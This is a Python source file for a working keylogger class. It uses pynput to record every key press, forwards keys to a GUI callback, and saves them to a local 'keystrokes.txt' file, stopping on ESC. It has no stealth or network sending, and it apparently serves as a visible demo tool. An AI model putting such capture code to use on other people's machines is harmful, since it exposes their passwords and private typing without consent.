from pynput import keyboard
from log_handler import LogHandler

class KeyLogger:
    def __init__(self, live_callback=None):
        self.log = []
        self.listener = None
        self.log_handler = LogHandler("keystrokes.txt")
        self.live_callback = live_callback  # GUI hook for real-time updates

    def _on_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = f"[{key.name}]"

        self.log.append(key_str)

        # Send key to GUI if callback is set
        if self.live_callback:
            self.live_callback(key_str)

    def _on_release(self, key):
        if key == keyboard.Key.esc:
            return False  # Stop on ESC

    def start_logging(self):
        self.log = []
        with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as self.listener:
            self.listener.join()
        self.save_log()

    def save_log(self):
        self.log_handler.save(self.log)
